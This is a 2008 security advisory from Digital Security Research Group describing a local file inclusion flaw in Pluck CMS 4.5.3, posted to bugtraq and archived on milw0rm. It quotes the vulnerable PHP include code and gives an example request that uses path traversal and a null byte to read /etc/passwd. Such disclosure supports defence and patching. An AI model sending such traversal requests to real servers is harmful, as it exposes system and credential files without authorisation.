@@ -1,0 +1,80 @@
+Hello, bugtraq.
+
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-039
+
+
+Application:                    Pluck CMS
+Versions Affected:              4.5.3
+Vendor URL:                     http://www.pluck-cms.org/
+Bug:                            Local File Include
+Exploits:                       YES
+Reported:                       25.08.2008
+Vendor Response:                30.08.2008
+Solution:                       YES 
+Date of Public Advisory:        18.11.2008
+Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Pluck CMS has Local File Include vulnerability. 
+
+
+
+Details
+*******
+
+1. Local File Include vulnerability found in script data/inc/lib/pcltar.lib.php
+
+Successful exploitation requires that "register_globals" is enabled.
+
+Code
+----
+#################################################
+
+  if (!isset($g_pcltar_lib_dir))
+    $g_pcltar_lib_dir = "lib";
+
+...
+
+  $g_pcltar_extension = "php";
+
+  if (!defined("PCLERROR_LIB"))
+  {
+    include("data/inc/$g_pcltar_lib_dir/pclerror.lib.$g_pcltar_extension");
+  }
+  if (!defined("PCLTRACE_LIB"))
+  {
+    include("data/inc/$g_pcltar_lib_dir/pcltrace.lib.$g_pcltar_extension");
+  }
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/data/inc/lib/pcltar.lib.php?g_pcltar_lib_dir=../../../../../../../../../../../../../etc/passwd%00
+
+
+
+Solution
+********
+Vendor fix this flaw on 09.08.2008. New version of Pluck CMS 4.6 can be download here:
+
+
+http://www.pluck-cms.org/downloads/click.php?id=8
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards.
+Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsec [dot] ru
+            http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-11-18]
